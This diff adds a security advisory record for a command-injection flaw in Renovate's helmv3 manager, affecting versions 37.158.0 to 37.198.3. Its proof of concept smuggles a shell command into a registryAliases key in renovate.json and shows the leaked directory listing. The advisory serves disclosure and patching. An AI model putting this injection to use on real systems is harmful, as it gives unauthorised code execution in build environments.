@@ -1,0 +1,270 @@
+advisory_id: GHSA-rqgv-292v-5qgr
+datasource_id: github_osv/GHSA-rqgv-292v-5qgr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-rqgv-292v-5qgr/GHSA-rqgv-292v-5qgr.json
+aliases: []
+summary: |
+  Renovate vulnerable to arbitrary command injection via helmv3 manager and registryAliases
+  ### Summary
+
+  Attackers with commit access to the default branch of a repo using Renovate could manipulate helmv3 registryAliases to execute arbitrary commands.
+
+  ### Details
+
+  Since [#26848](https://github.com/renovatebot/renovate/pull/26848), `registryAliases` has become mergeable. This means that the helmv3 manager started honoring its value and uses a `helm repo add <key> <parameters>` command for each defined alias. See source code: https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80
+  The key was not quoted, leading to the ability to use variable references (`$FOO`) in it and have them printed by Renovate on the pull request, or even running any shell commands.
+
+  ### PoC
+
+  Inside a repository where Renovate runs, add a Helm chart with an outdated dependency, for example:
+
+  test-chart/Chart.yaml:
+
+  ```
+  apiVersion: v2
+  name: redis
+  version: 1.0.0
+  dependencies:
+    - name: redis
+      version: 18.13.10
+      repository: oci://registry-1.docker.io/bitnamicharts
+  ```
+
+  test-chart/Chart.lock:
+
+  ```
+  dependencies:
+  - name: redis
+    repository: oci://registry-1.docker.io/bitnamicharts
+    version: 18.13.10
+  digest: sha256:11267bd32ea6c5c120ddebbb9f21e4a3c7700a961aa1a27ddb55df1fb8059a38
+  generated: "2024-02-16T13:31:20.807026334Z"
+  ```
+
+  Then add the following `renovate.json`:
+
+  ```json
+  {
+    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
+    "extends": [
+      "config:base"
+    ],
+    "registryAliases": {
+      "foo/bar || sh -c 'ls /; exit 1' >&2": "registry.example.com/proxy"
+    }
+  }
+  ```
+
+  Once Renovate runs on the repository, it will create a pull request, and add a comment titled "Artifact update problem" containing the following text:
+
+  ```
+  File name: test-chart/Chart.lock
+
+  Command failed: helm repo add foo/bar || sh -c 'ls /; exit 1' >&2 registry.example.com/proxy --force-update
+  Error: "helm repo add" requires 2 arguments
+
+  Usage:  helm repo add [NAME] [URL] [flags]
+  bin
+  boot
+  dev
+  etc
+  go
+  home
+  lib
+  lib32
+  lib64
+  libx32
+  media
+  mnt
+  opt
+  proc
+  root
+  run
+  sbin
+  srv
+  sys
+  tmp
+  usr
+  var
+  ```
+
+  This shows that the `ls` command executed successfully, and we can even see its output.
+
+  Note that redirecting any output you want to see to stderr (`>&2`) and making sure the final command fails (`exit 1`) is required in this case, as Renovate only adds a comment if the command fails, and it contains only stderr (not stdout) output.
+
+  ### Impact
+
+  All Renovate versions from 37.158.0 up until 37.199.0 were affected. This vulnerability allows full access to Renovate's execution environment. The level of severity depends on how Renovate is deployed (Docker, Kubernetes, CI pipeline, ...) and whether Renovate is being offered to untrusted users/repositories.
+impacted_packages:
+  - purl: pkg:github/renovatebot/renovate
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/renovatebot/renovate
+        commit: 23f3df6216375cb5bcfe027b0faee304f877f891
+        patch_text:
+      - vcs_url: https://github.com/renovatebot/renovate
+        commit: 1e941fd885c799f2d38f4084a6f4cb9438813c8f
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/renovate
+    affected_versions: vers:npm/>=37.158.0|<37.199.0
+    fixed_versions: vers:npm/37.199.0
+    affected_packages:
+      - pkg:npm/renovate@37.158.0
+      - pkg:npm/renovate@37.158.1
+      - pkg:npm/renovate@37.158.2
+      - pkg:npm/renovate@37.159.0
+      - pkg:npm/renovate@37.159.1
+      - pkg:npm/renovate@37.160.0
+      - pkg:npm/renovate@37.161.0
+      - pkg:npm/renovate@37.162.0
+      - pkg:npm/renovate@37.162.1
+      - pkg:npm/renovate@37.162.2
+      - pkg:npm/renovate@37.163.0
+      - pkg:npm/renovate@37.163.1
+      - pkg:npm/renovate@37.163.2
+      - pkg:npm/renovate@37.164.0
+      - pkg:npm/renovate@37.165.0
+      - pkg:npm/renovate@37.165.1
+      - pkg:npm/renovate@37.165.2
+      - pkg:npm/renovate@37.165.3
+      - pkg:npm/renovate@37.165.4
+      - pkg:npm/renovate@37.165.5
+      - pkg:npm/renovate@37.165.6
+      - pkg:npm/renovate@37.165.7
+      - pkg:npm/renovate@37.166.0
+      - pkg:npm/renovate@37.167.0
+      - pkg:npm/renovate@37.168.0
+      - pkg:npm/renovate@37.168.1
+      - pkg:npm/renovate@37.168.2
+      - pkg:npm/renovate@37.168.3
+      - pkg:npm/renovate@37.168.4
+      - pkg:npm/renovate@37.168.5
+      - pkg:npm/renovate@37.169.0
+      - pkg:npm/renovate@37.170.0
+      - pkg:npm/renovate@37.171.0
+      - pkg:npm/renovate@37.171.1
+      - pkg:npm/renovate@37.171.2
+      - pkg:npm/renovate@37.172.0
+      - pkg:npm/renovate@37.172.1
+      - pkg:npm/renovate@37.172.2
+      - pkg:npm/renovate@37.172.3
+      - pkg:npm/renovate@37.172.4
+      - pkg:npm/renovate@37.173.0
+      - pkg:npm/renovate@37.173.1
+      - pkg:npm/renovate@37.173.2
+      - pkg:npm/renovate@37.173.3
+      - pkg:npm/renovate@37.173.4
+      - pkg:npm/renovate@37.174.0
+      - pkg:npm/renovate@37.174.1
+      - pkg:npm/renovate@37.174.2
+      - pkg:npm/renovate@37.174.3
+      - pkg:npm/renovate@37.174.4
+      - pkg:npm/renovate@37.174.5
+      - pkg:npm/renovate@37.174.6
+      - pkg:npm/renovate@37.174.7
+      - pkg:npm/renovate@37.175.0
+      - pkg:npm/renovate@37.175.1
+      - pkg:npm/renovate@37.175.2
+      - pkg:npm/renovate@37.175.3
+      - pkg:npm/renovate@37.176.0
+      - pkg:npm/renovate@37.176.1
+      - pkg:npm/renovate@37.177.0
+      - pkg:npm/renovate@37.178.0
+      - pkg:npm/renovate@37.179.0
+      - pkg:npm/renovate@37.180.0
+      - pkg:npm/renovate@37.180.1
+      - pkg:npm/renovate@37.181.0
+      - pkg:npm/renovate@37.181.1
+      - pkg:npm/renovate@37.181.2
+      - pkg:npm/renovate@37.181.3
+      - pkg:npm/renovate@37.181.4
+      - pkg:npm/renovate@37.181.5
+      - pkg:npm/renovate@37.181.6
+      - pkg:npm/renovate@37.181.7
+      - pkg:npm/renovate@37.181.8
+      - pkg:npm/renovate@37.181.9
+      - pkg:npm/renovate@37.181.10
+      - pkg:npm/renovate@37.181.11
+      - pkg:npm/renovate@37.182.0
+      - pkg:npm/renovate@37.182.1
+      - pkg:npm/renovate@37.182.2
+      - pkg:npm/renovate@37.182.3
+      - pkg:npm/renovate@37.183.0
+      - pkg:npm/renovate@37.183.1
+      - pkg:npm/renovate@37.183.2
+      - pkg:npm/renovate@37.184.0
+      - pkg:npm/renovate@37.184.1
+      - pkg:npm/renovate@37.184.2
+      - pkg:npm/renovate@37.184.3
+      - pkg:npm/renovate@37.185.0
+      - pkg:npm/renovate@37.185.1
+      - pkg:npm/renovate@37.186.0
+      - pkg:npm/renovate@37.186.1
+      - pkg:npm/renovate@37.187.0
+      - pkg:npm/renovate@37.187.1
+      - pkg:npm/renovate@37.187.2
+      - pkg:npm/renovate@37.188.0
+      - pkg:npm/renovate@37.188.1
+      - pkg:npm/renovate@37.189.0
+      - pkg:npm/renovate@37.189.1
+      - pkg:npm/renovate@37.189.2
+      - pkg:npm/renovate@37.190.0
+      - pkg:npm/renovate@37.190.1
+      - pkg:npm/renovate@37.191.0
+      - pkg:npm/renovate@37.191.1
+      - pkg:npm/renovate@37.191.2
+      - pkg:npm/renovate@37.192.0
+      - pkg:npm/renovate@37.192.1
+      - pkg:npm/renovate@37.192.2
+      - pkg:npm/renovate@37.192.3
+      - pkg:npm/renovate@37.192.4
+      - pkg:npm/renovate@37.193.0
+      - pkg:npm/renovate@37.193.1
+      - pkg:npm/renovate@37.194.0
+      - pkg:npm/renovate@37.194.1
+      - pkg:npm/renovate@37.194.2
+      - pkg:npm/renovate@37.194.3
+      - pkg:npm/renovate@37.194.4
+      - pkg:npm/renovate@37.194.5
+      - pkg:npm/renovate@37.194.6
+      - pkg:npm/renovate@37.195.0
+      - pkg:npm/renovate@37.196.0
+      - pkg:npm/renovate@37.197.0
+      - pkg:npm/renovate@37.198.0
+      - pkg:npm/renovate@37.198.1
+      - pkg:npm/renovate@37.198.2
+      - pkg:npm/renovate@37.198.3
+    fixed_packages:
+      - pkg:npm/renovate@37.199.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-rqgv-292v-5qgr/GHSA-rqgv-292v-5qgr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/renovatebot/renovate
+    reference_type:
+    reference_id:
+  - url: https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80
+    reference_type:
+    reference_id:
+  - url: https://github.com/renovatebot/renovate/commit/1e941fd885c799f2d38f4084a6f4cb9438813c8f
+    reference_type:
+    reference_id:
+  - url: https://github.com/renovatebot/renovate/security/advisories/GHSA-rqgv-292v-5qgr
+    reference_type:
+    reference_id: GHSA-rqgv-292v-5qgr
+exploits: []
